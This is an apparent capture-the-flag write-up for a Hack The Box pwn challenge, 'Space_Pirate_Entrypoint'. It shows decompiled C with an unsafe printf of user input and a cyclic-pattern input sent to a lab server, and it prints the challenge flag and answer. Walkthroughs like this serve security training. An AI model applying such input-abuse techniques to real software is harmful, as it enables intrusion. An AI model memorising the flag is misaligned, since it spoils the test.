# Space_Pirate_Entrypoint

## FLAG: HTB{th3_g4t35_4r3_0p3n!}

## Status: Complete

+ DOCKER: YES
+ DOWNLOADABLE: YES

Description: D12 is one of Golden Fang's missile launcher spaceships. Our mission as space pirates is to highjack D12, get inside the control panel room, and access the missile launcher system. To achieve our goal, we split the mission into three parts. In this part, all we need to do is bypass the scanning system and open the gates so that we proceed further.

## NOTES

1. > unzip pwn_sp_entrypoint.zip
2. > cd challenge
3. > strings sp_entrypoint
    + We see a potential password: `0nlyTh30r1g1n4lCr3wM3mb3r5C4nP455`
4. > ghidra sp_entrypoint
    + In main() we see that we want to get to the open_door() function

    ```c
    undefined8 main(void)

    {
    long lVar1;
    long in_FS_OFFSET;
    long local_48;
    long *local_40;
    char local_38 [40];
    long local_10;
    
    local_10 = *(long *)(in_FS_OFFSET + 0x28);
    setup();
    banner();
    local_48 = 0xdeadbeef;
    local_40 = &local_48;
    printf(&DAT_001025e0);
    lVar1 = read_num();
    if (lVar1 != 1) {
        if (lVar1 == 2) {
        check_pass();
        }
        printf(&DAT_00102668,&DAT_0010259a);
                        /* WARNING: Subroutine does not return */
        exit(0x1b39);
    }
    printf("\n[!] Scanning card.. Something is wrong!\n\nInsert card\'s serial number: ");
    read(0,local_38,0x1f);
    printf("\nYour card is: ");
    printf(local_38);
    if (local_48 == 0xdead1337) {
        open_door();
    }
    else {
        printf(&DAT_001026a0,&DAT_0010259a);
    }
    if (local_10 == *(long *)(in_FS_OFFSET + 0x28)) {
        return 0;
    }
                        /* WARNING: Subroutine does not return */
    __stack_chk_fail();
    }
    ```
5. re-ran with gdb (make sure to select option 2 for password) and tried flooding with pattern create `aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaazaaaaaabbaaaaaabcaaaaaabdaaaaaabeaaaaaabfaaaaaabgaaaaaabhaaaaaabiaaaaaabjaaaaaabkaaaaaablaaaaaabmaaaaaabnaaaaaaboaaaaaabpaaaaaabqaaaaaabraaaaaabsaaaaaabtaaaaaabuaaaaaabvaaaaaabwaaaaaabxaaaaaabyaaaaaabzaaaaaacbaaaaaaccaaaaaacdaaaaaaceaaaaaacfaaaaaacgaaaaaachaaaaaaciaaaaaacjaaaaaackaaaaaaclaaaaaacmaaaaaacnaaaaaacoaaaaaacpaaaaaacqaaaaaacraaaaaacsaaaaaactaaaaaacuaaaaaacvaaaaaacwaaaaaacxaaaaaacyaaaaaaczaaaaaadbaaaaaadcaaaaaaddaaaaaadeaaaaaadfaaaaaadgaaaaaadhaaaaaadiaaaaaadjaaaaaadkaaaaaadlaaaaaadmaaaaaadnaaaaaadoaaaaaadpaaaaaadqaaaaaadraaaaaadsaaaaaadtaaaaaaduaaaaaadvaaaaaadwaaaaaadxaaaaaadyaaaaaadzaaaaaaebaaaaaaecaaaaaaedaaaaaaeeaaaaaaefaaaaaaegaaaaaaehaaaaaaeiaaaaaaejaaaaaaekaaaaaaelaaaaaaemaaaaaaenaaaaaaeoaaaaaaepaaaaaaeqaaaaaaeraaaaaaesaaaaaaetaaaaaaeuaaaaaaevaaaaaaewaaaaaaexaaaaaaeyaaaaaaezaaaaaafbaaaaaafcaaaaaaf`

6. tested this method locally! Wooohoo
7. nc 46.101.27.51 32707
    > "SELECT OPTION": 2
    > "INSTERT PASSWORD" : `aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaazaaaaaabbaaaaaabcaaaaaabdaaaaaabeaaaaaabfaaaaaabgaaaaaabhaaaaaabiaaaaaabjaaaaaabkaaaaaablaaaaaabmaaaaaabnaaaaaaboaaaaaabpaaaaaabqaaaaaabraaaaaabsaaaaaabtaaaaaabuaaaaaabvaaaaaabwaaaaaabxaaaaaabyaaaaaabzaaaaaacbaaaaaaccaaaaaacdaaaaaaceaaaaaacfaaaaaacgaaaaaachaaaaaaciaaaaaacjaaaaaackaaaaaaclaaaaaacmaaaaaacnaaaaaacoaaaaaacpaaaaaacqaaaaaacraaaaaacsaaaaaactaaaaaacuaaaaaacvaaaaaacwaaaaaacxaaaaaacyaaaaaaczaaaaaadbaaaaaadcaaaaaaddaaaaaadeaaaaaadfaaaaaadgaaaaaadhaaaaaadiaaaaaadjaaaaaadkaaaaaadlaaaaaadmaaaaaadnaaaaaadoaaaaaadpaaaaaadqaaaaaadraaaaaadsaaaaaadtaaaaaaduaaaaaadvaaaaaadwaaaaaadxaaaaaadyaaaaaadzaaaaaaebaaaaaaecaaaaaaedaaaaaaeeaaaaaaefaaaaaaegaaaaaaehaaaaaaeiaaaaaaejaaaaaaekaaaaaaelaaaaaaemaaaaaaenaaaaaaeoaaaaaaepaaaaaaeqaaaaaaeraaaaaaesaaaaaaetaaaaaaeuaaaaaaevaaaaaaewaaaaaaexaaaaaaeyaaaaaaezaaaaaafbaaaaaafcaaaaaaf`
    > [+] Door opened, you can proceed with the passphrase: HTB{th3_g4t35_4r3_0p3n!}
